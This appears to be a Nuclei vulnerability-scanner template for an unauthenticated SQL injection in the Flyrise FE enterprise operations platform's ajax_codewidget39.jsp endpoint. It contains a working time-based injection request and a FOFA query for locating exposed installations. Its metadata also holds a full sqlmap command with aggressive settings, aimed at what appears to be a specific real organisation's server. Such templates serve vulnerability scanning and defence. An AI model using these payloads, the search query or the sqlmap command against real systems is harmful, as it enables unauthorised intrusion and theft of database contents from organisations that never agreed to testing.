id: flyrise-ajax-codewidget39-sqli
info:
  name: 飞企互联 FE 企业运营管理平台 ajax_codewidget39.jsp - sqli
  author: leadlife
  severity: high
  description: 飞企互联-FE企业运营管理平台接口 `/common/ajax_codewidget39.jsp` 存在SQL注入漏洞，未经身份验证的攻击者可以利用此漏洞获取数据库数据。
  reference:
    - todo
  metadata:
    verified: true
    fofa-query: app="飞企互联-FE企业运营管理平台"
    sqlmap: sqlmap -u "https://oa.ronghuai.cn/common/ajax_codewidget39.jsp;.js?code=1" -p "code" --batch --random-agent  --tamper=space2comment --risk 3 --dbms="Microsoft SQL Server"
  tags: sqli,flyrise,time

http:
  - raw:
      - |
        @timeout: 15s
        GET /common/ajax_codewidget39.jsp;.js?code=1%27;waitfor+delay+%270:0:6%27-- HTTP/1.1
        Host: {{Hostname}}
    
    matchers:
      - type: dsl
        dsl:
          - status_code == 200
          - duration >= 5 && duration < 9
        condition: and